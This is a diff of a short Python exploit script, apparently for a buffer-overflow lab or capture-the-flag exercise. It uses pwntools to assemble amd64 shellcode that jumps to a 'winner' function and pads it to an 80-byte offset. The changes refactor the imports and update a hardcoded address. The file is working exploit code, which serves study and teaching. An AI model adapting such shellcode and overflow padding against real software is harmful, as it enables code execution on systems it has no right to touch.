@@ -1,17 +1,17 @@
-import pwnlib
+from pwnlib import shellcraft, asm, context
 import struct
 
-DATA_ADDR = 0x7ffff7ef6010
+DATA_ADDR = 0x7ffff7ef4010
 WINNER_ADDR = 0x400abd
 
-pwnlib.context.arch = 'amd64'
+context.arch = 'amd64'
 # push ADDR
-shellcode = pwnlib.shellcraft.amd64.push(WINNER_ADDR)
+shellcode = shellcraft.amd64.push(WINNER_ADDR)
 # ret
-shellcode += pwnlib.shellcraft.amd64.ret()
+shellcode += shellcraft.amd64.ret()
 
 # assembla lo shellcode per architettura amd64
-shellcode = pwnlib.asm.asm(shellcode, arch='amd64')
+shellcode = asm.asm(shellcode, arch='amd64')
 
 # offset tra fp e buf e' di 80 caratteri
 buf = shellcode + "A" * (80 - len(shellcode)) 
